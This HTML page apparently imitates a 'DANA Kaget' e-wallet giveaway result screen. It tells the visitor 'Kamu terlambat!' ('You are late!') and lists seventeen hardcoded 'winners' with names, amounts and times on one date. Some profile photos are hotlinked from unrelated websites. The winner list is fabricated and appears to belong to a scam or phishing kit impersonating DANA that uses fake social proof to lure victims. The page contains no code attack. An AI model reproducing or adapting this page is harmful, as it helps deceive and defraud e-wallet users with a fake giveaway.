<!DOCTYPE html>
<html>
    <head>
        <title>DANA Kaget buatmu</title>
        <meta charset="UTF-8">
  <meta property="og:image:type" content="image/jpeg">
  <meta property="og:image" content="https://telegra.ph/file/4032d0f0073f9ba65009f.jpg">
        <meta name="description" content="DANA Kaget Cuma buat kamu yang paling gesit! Sikat sekarang!">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<!--        <link rel="stylesheet" type="text/css" href="./../../../lib/style/kaget.css">-->
        <link rel="stylesheet" type="text/css" href="../../lib/style/late.css">
        <link rel="shortcut icon" href="../../assets/img/favicon/favicon.ico" type="image/x-icon">
    </head>
    <body>
        <div class="container">
            <div class="head">
                <a class="aback" href="../"><img class="back" src="../../assets/img/back.png"></a>
                <h2 class="late">Kamu terlambat!</h2>             
            </div>
            <dic class="winner">
                <img src="../../assets/img/end.jpg" class="banner_end">
                <div class="win">PEMENANG</div>

                <div class="profil">
                    <p class="name">AGUNG PAMBUDI</p>
                    <p class="dte">30 Juli 2023 - 15:58</p>
                    <p class="rp">Rp50.000</p>
                    <img class="null"
                        src="../../assets/img/pict/1.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">AULIA PUTRI</p>
                    <p class="dte">30 Juli 2023 - 13:40</p>
                    <p class="rp">Rp100.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/2.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">LUKMAN RAMADHAN</p>
                    <p class="dte">30 Juli 2023 - 20:43</p>
                    <p class="rp">Rp25.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/11.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">SINTA DEWI</p>
                    <p class="dte">30 Juli 2023 - 20:43</p>
                    <p class="rp">Rp50.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/3.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">REZA RADITYA</p>
                    <p class="dte">30 Juli 2023 - 12:28</p>
                    <p class="rp">Rp30.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/12.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">CANDRA SAPUTRA</p>
                    <p class="dte">30 Juli 2023 - 09:43</p>
                    <p class="rp">Rp50.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/4.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">RENA ALFHARIZQI</p>
                    <p class="dte">30 Juli 2023 - 20:43</p>
                    <p class="rp">Rp20.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/5.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">ROHMAN</p>
                    <p class="dte">30 Juli 2023 - 20:43</p>
                    <p class="rp">Rp50.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/13.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">DEVITA SARASWATI</p>
                    <p class="dte">30 Juli 2023 - 20:43</p>
                    <p class="rp">Rp15.500</p>
                    <img class="null" 
                        src="https://divedigital.id/wp-content/uploads/2021/11/1-1024x1024.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">MULIA ANDIKA</p>
                    <p class="dte">30 Juli 2023 - 08:57</p>
                    <p class="rp">Rp50.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/14.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">RIZKY FERMANSYAH</p>
                    <p class="dte">30 Juli 2023 - 15:15</p>
                    <p class="rp">Rp30.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/15.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">MEGA SUKMANA</p>
                    <p class="dte">30 Juli 2023 - 20:33</p>
                    <p class="rp">Rp10.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/16.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">NUR DIANSYAH</p>
                    <p class="dte">30 Juli 2023 - 20:13</p>
                    <p class="rp">Rp100.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/17.jpg"
                    >
                </div>

                <div class="profil">
                    <p class="name">RISMA AULIA</p>
                    <p class="dte">30 Juli 2023 - 20:25</p>
                    <p class="rp">Rp50.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/6.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">SAFITRI SANTI</p>
                    <p class="dte">30 Juli 2023 - 20:33</p>
                    <p class="rp">Rp50.000</p>
                    <img class="null" 
                        src="https://i.pinimg.com/280x280_RS/28/34/28/283428bd1790a1c681cdf8572ab1f7ee.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">FATHUS SALIM</p>
                    <p class="dte">30 Juli 2023 - 20:40</p>
                    <p class="rp">Rp30.000</p>
                    <img class="null" 
                        src="../../assets/img/pict/7.jpg"
                    >
                </div>
                <div class="profil">
                    <p class="name">FIFI FADILAH</p>
                    <p class="dte">30 Juli 2023 - 10.00</p>
                    <p class="rp">Rp20.000</p>
                    <img class="null" 
                        src="https://divedigital.id/wp-content/uploads/2021/11/8.jpg"
                    >
                </div>
                <div class="buton">
                    <a href="../index.html">
                        <button>TUTUP</button>
                    </a>
                </div> <!--button close-->
            </div>
        </div>
    </body>
</html>
